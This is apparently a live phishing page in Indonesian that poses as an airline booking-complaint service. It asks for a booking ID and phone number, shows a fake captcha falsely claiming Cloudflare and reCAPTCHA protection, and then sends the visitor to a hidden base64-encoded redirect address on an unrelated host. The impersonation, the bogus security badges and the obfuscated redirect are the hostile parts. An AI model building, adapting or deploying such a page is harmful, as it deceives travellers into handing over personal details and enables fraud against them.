<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Layanan Penerbangan Indonesia</title>

  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
      background: #000;
      display: flex;
      justify-content: center;
      min-height: 100vh;
    }

    .mobile-container {
      position: relative;
      width: 100%;
      max-width: 480px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: url('https://penerbanganmaskapai.com/assets/img/planes.jpg') center/cover no-repeat fixed;
    }

    .mobile-container::before {
      content: "";
      position: absolute;
      inset: 0;
      background: rgba(0, 0, 0, 0.4);
      z-index: 0;
    }

    .content-wrapper {
      position: relative;
      z-index: 1;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      width: 100%;
    }

    .top-header-img {
      position: relative;
      width: 100%;
      height: 260px;
      background: url('https://penerbanganmaskapai.com/assets/img/cssku.jpeg') center 20%/cover no-repeat;
    }

    .top-header-overlay {
      position: absolute;
      inset: 0;
      background: linear-gradient(to bottom, rgba(0,0,0,0.1) 30%, rgba(0,0,0,0.8) 100%);
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
      padding: 30px 20px;
      text-align: left;
      color: white;
    }

    .top-header-overlay h1 {
      font-size: 24px;
      font-weight: 700;
      margin: 0 0 5px 0;
      line-height: 1.2;
    }

    .top-header-overlay p {
      font-size: 14px;
      font-weight: 400;
      margin: 0;
      color: #f3f4f6;
    }

    .form-container {
      padding: 30px 24px;
      flex: 1;
      display: flex;
      flex-direction: column;
      background: linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0.85) 100%);
      color: white;
    }

    .form-title {
      font-size: 19px;
      font-weight: 600;
      color: #ffffff;
      margin: 0 0 20px 0;
      line-height: 1.4;
    }

    .footer-text {
      text-align: center;
      padding: 20px;
      font-size: 13px;
      color: #9ca3af;
      font-weight: 500;
      margin-top: auto;
    }

    /* Modal Puzzle Styles */
    #puzzleModal {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.65);
      backdrop-filter: blur(4px);
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }

    .captcha-card {
      background: #ffffff;
      border-radius: 16px;
      width: 100%;
      max-width: 360px;
      padding: 20px;
      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.2);
      position: relative;
      animation: popUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    @keyframes popUp {
      from { transform: scale(0.85); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    .slider-container {
      position: relative;
      width: 100%;
      height: 42px;
      background: #f1f5f9;
      border-radius: 21px;
      border: 1px solid #cbd5e1;
      margin-top: 15px;
      overflow: hidden;
    }

    .slider-track {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 0%;
      background: #3b82f6;
      border-radius: 21px 0 0 21px;
      transition: width 0.05s ease;
    }

    .slider-thumb {
      position: absolute;
      top: 2px;
      left: 2px;
      width: 36px;
      height: 36px;
      background: #ffffff;
      border-radius: 50%;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      user-select: none;
      color: #3b82f6;
      font-size: 14px;
      transition: left 0.05s ease;
    }
  </style>
</head>
<body>

  <div class="mobile-container">
    <div class="content-wrapper">
      
      <!-- Header Banner -->
      <div class="top-header-img">
        <div class="top-header-overlay">
          <h1>Layanan Penerbangan Indonesia</h1>
          <p>Kami siap membantu masalah penerbangan Anda!</p>
        </div>
      </div>

      <!-- Form Area -->
      <div class="form-container">
        <h4 class="form-title">Formulir Pengaduan Booking Tiket</h4>
        
        <form id="bookingForm" class="w-full">
          
          <label class="block text-sm font-semibold mb-2 text-white" for="opsi">Pilih Opsi</label>
          <div class="relative mb-4">
            <select class="w-full border border-gray-400 bg-white rounded-md px-3 py-2 text-sm text-gray-900 appearance-none" id="opsi" name="a" required>
              <option value="" disabled selected>-- Pilih Opsi --</option>
              <option value="Booking Seat">Booking Seat</option>
              <option value="Checkin Online">Check in Online</option>
              <option value="Refund Dana">Refund Dana</option>
              <option value="Reschedule">Reschedule</option>
              <option value="Tambah Bagasi">Tambah Bagasi</option>
              <option value="Update Nama">Update Nama</option>
              <option value="Lainnya">Bantuan Lainnya</option>
            </select>
          </div>
          
          <label class="block text-sm font-semibold mb-2 text-white" for="idBooking">Masukkan ID Booking</label>
          <div class="relative mb-4">
            <input class="w-full border border-gray-400 bg-white text-gray-900 rounded-md px-3 py-2 text-sm uppercase placeholder-gray-500" id="idBooking" name="b" required type="text">
          </div>
          
          <label class="block text-sm font-semibold mb-2 text-white" for="phone">Nomor Handphone</label>
          <div class="mb-6">
            <input class="w-full border border-gray-400 bg-white text-gray-900 rounded-md px-3 py-2 text-sm placeholder-gray-500" id="phone" name="c" maxlength="16" placeholder="+62xxxxxxxxx" required type="tel">
          </div>
          
          <button class="w-full bg-[#3b5998] hover:bg-blue-700 text-white text-sm font-semibold py-3 rounded-md shadow transition-colors" type="submit">
            Konfirmasi
          </button>

        </form>
      </div>

      <!-- Footer -->
      <div class="footer-text">
        Layanan Penerbangan - All Rights Reserved.
      </div>

    </div>
  </div>

  <!-- Loading Overlay -->
  <div id="loadingOverlay" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div class="flex flex-col items-center space-y-4">
      <svg class="animate-spin h-12 w-12 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
      </svg>
      <span class="text-white font-semibold text-lg">Loading...</span>
    </div>
  </div>

  <!-- Modal Puzzle Captcha -->
  <div id="puzzleModal" style="display: none;">
    <div class="captcha-card">
      <div class="flex justify-between items-center mb-3">
        <div class="flex items-center space-x-2">
          <i class="fas fa-shield-alt text-blue-600 text-xl"></i>
          <h3 class="text-base font-bold text-gray-800 m-0">Verifikasi Keamanan</h3>
        </div>
        <button onclick="closeVerificationModal()" class="text-gray-400 hover:text-gray-600 text-lg border-0 bg-transparent">&times;</button>
      </div>
      <p class="text-xs text-gray-500 mb-4">Selesaikan verifikasi captcha berikut untuk memastikan Anda bukan bot atau malware.</p>

      <div id="captchaSlideArea">
        <div class="relative w-full h-36 bg-gray-200 rounded-lg overflow-hidden flex items-center justify-center border border-gray-300">
          <img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=400&q=80" class="w-full h-full object-cover">
          <div id="puzzleTarget" class="absolute w-12 h-12 bg-black bg-opacity-60 border-2 border-dashed border-white rounded" style="top: 35px; right: 40px;"></div>
          <div id="puzzlePiece" class="absolute w-12 h-12 border-2 border-white rounded shadow-lg overflow-hidden" style="top: 35px; left: 10px; background-image: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=400&q=80'); background-size: 320px 144px; background-position: -220px -35px;"></div>
        </div>

        <div class="slider-container" id="sliderBox">
          <div class="slider-track" id="sliderTrack"></div>
          <div class="slider-thumb" id="sliderThumb">
            <i class="fas fa-arrow-right"></i>
          </div>
        </div>
        <p class="text-center text-xs text-gray-400 mt-2">Geser slider untuk mencocokkan puzzle</p>
      </div>

      <div id="captchaMathArea" style="display: none;" class="mt-2">
        <div class="bg-blue-50 border border-blue-200 p-3 rounded-lg mb-3 text-center">
          <span class="text-xs font-semibold text-blue-800">Berapa hasil dari:</span>
          <div class="text-xl font-bold text-blue-900 mt-1" id="mathQuestion">5 + 3 = ?</div>
        </div>
        <input type="number" id="mathAnswer" placeholder="Masukkan jawaban" class="w-full p-2 border border-gray-300 rounded text-center text-sm mb-3 focus:outline-none focus:border-blue-500">
        <button onclick="verifyMathCaptcha()" class="w-full bg-blue-600 text-white font-bold py-2 rounded text-sm hover:bg-blue-700">Verifikasi Jawaban</button>
      </div>

      <div class="text-center mt-3 pt-2 border-t border-gray-100 flex justify-between items-center">
        <span class="text-[10px] text-gray-400">Protected by Cloudflare & reCAPTCHA</span>
        <button type="button" onclick="switchCaptchaType()" class="text-[11px] text-blue-600 underline bg-transparent border-0">Ganti Mode</button>
      </div>
    </div>
  </div>

  <script>
    const encodedRedirectUrl = 'aHR0cHM6Ly9mb3JtdWxpcm1hc2thcGFpLmVkZ2VvbmUuZGV2';
    const loadingOverlay = document.getElementById('loadingOverlay');

    let currentCaptchaMode = 'slide';
    let numA = 0, numB = 0;

    function openVerificationModal() {
      document.getElementById('puzzleModal').style.display = 'flex';
      resetSlider();
      generateMathCaptcha();
    }

    function closeVerificationModal() {
      document.getElementById('puzzleModal').style.display = 'none';
    }

    function switchCaptchaType() {
      if (currentCaptchaMode === 'slide') {
        currentCaptchaMode = 'math';
        document.getElementById('captchaSlideArea').style.display = 'none';
        document.getElementById('captchaMathArea').style.display = 'block';
      } else {
        currentCaptchaMode = 'slide';
        document.getElementById('captchaSlideArea').style.display = 'block';
        document.getElementById('captchaMathArea').style.display = 'none';
        resetSlider();
      }
    }

    function executeSuccessVerification() {
      closeVerificationModal();
      loadingOverlay.classList.remove('hidden');

      setTimeout(() => {
        window.location.href = atob(encodedRedirectUrl);
      }, 800);
    }

    const sliderThumb = document.getElementById('sliderThumb');
    const sliderTrack = document.getElementById('sliderTrack');
    const sliderBox = document.getElementById('sliderBox');
    const puzzlePiece = document.getElementById('puzzlePiece');
    let isDragging = false;
    let startX = 0;

    function resetSlider() {
      sliderThumb.style.left = '2px';
      sliderTrack.style.width = '0%';
      puzzlePiece.style.left = '10px';
    }

    function onDragStart(e) {
      isDragging = true;
      startX = e.type === 'touchstart' ? e.touches[0].clientX : e.clientX;
    }

    function onDragMove(e) {
      if (!isDragging) return;
      const currentX = e.type === 'touchmove' ? e.touches[0].clientX : e.clientX;
      let deltaX = currentX - startX;
      const maxLeft = sliderBox.clientWidth - 40;

      if (deltaX < 0) deltaX = 0;
      if (deltaX > maxLeft) deltaX = maxLeft;

      sliderThumb.style.left = (deltaX + 2) + 'px';
      sliderTrack.style.width = ((deltaX / maxLeft) * 100) + '%';
      
      let pieceLeft = 10 + (deltaX / maxLeft) * 230;
      puzzlePiece.style.left = pieceLeft + 'px';
    }

    function onDragEnd() {
      if (!isDragging) return;
      isDragging = false;
      const currentPieceLeft = parseFloat(puzzlePiece.style.left);
      
      if (currentPieceLeft >= 210 && currentPieceLeft <= 245) {
        executeSuccessVerification();
      } else {
        resetSlider();
      }
    }

    sliderThumb.addEventListener('mousedown', onDragStart);
    window.addEventListener('mousemove', onDragMove);
    window.addEventListener('mouseup', onDragEnd);

    sliderThumb.addEventListener('touchstart', onDragStart);
    window.addEventListener('touchmove', onDragMove);
    window.addEventListener('touchend', onDragEnd);

    function generateMathCaptcha() {
      numA = Math.floor(Math.random() * 9) + 1;
      numB = Math.floor(Math.random() * 9) + 1;
      document.getElementById('mathQuestion').innerText = `${numA} + ${numB} = ?`;
      document.getElementById('mathAnswer').value = '';
    }

    function verifyMathCaptcha() {
      const userAns = parseInt(document.getElementById('mathAnswer').value, 10);
      if (userAns === (numA + numB)) {
        executeSuccessVerification();
      } else {
        alert('Jawaban salah, silakan coba lagi.');
        generateMathCaptcha();
      }
    }

    document.getElementById('bookingForm').addEventListener('submit', function(e) {
      e.preventDefault();
      openVerificationModal();
    });
  </script>
</body>
</html>
